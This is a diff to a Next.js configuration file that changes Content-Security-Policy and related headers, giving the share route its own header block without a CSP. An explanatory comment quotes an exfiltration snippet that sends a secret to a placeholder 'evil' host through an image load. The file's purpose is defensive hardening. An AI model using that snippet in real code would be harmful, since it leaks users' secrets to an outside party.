@@ -5,8 +5,8 @@ import type { NextConfig } from "next";
 // exfiltrate to another origin. 'unsafe-inline' script-src is required by
 // Next's bootstrap scripts; styles are inline throughout the app; Google
 // Fonts is the only external origin (see app/layout.tsx). The share page
-// and the authorize form set their own, stricter CSP — browsers enforce
-// every policy present, so the strictest one wins there.
+// and the authorize form set their own, stricter CSP, so this one is not
+// sent there: a header set here replaces the one a route sends.
 // img-src is 'self' data: only, not https: — an open img-src lets injected
 // markup exfiltrate data via new Image().src = 'https://evil/?x='+secret,
 // which connect-src's 'self' does nothing to stop (image loads aren't
@@ -56,7 +56,17 @@ const nextConfig: NextConfig = {
         ],
       },
       {
-        source: '/((?!authorize$).*)',
+        source: '/share/:token',
+        headers: [
+          // No Content-Security-Policy: the route sends its own, which
+          // allows no script at all.
+          { key: 'X-Content-Type-Options', value: 'nosniff' },
+          { key: 'X-Frame-Options', value: 'DENY' },
+          { key: 'Referrer-Policy', value: 'no-referrer' },
+        ],
+      },
+      {
+        source: '/((?!authorize$|share/).*)',
         headers: [
           { key: 'Content-Security-Policy', value: CSP },
           { key: 'X-Content-Type-Options', value: 'nosniff' },
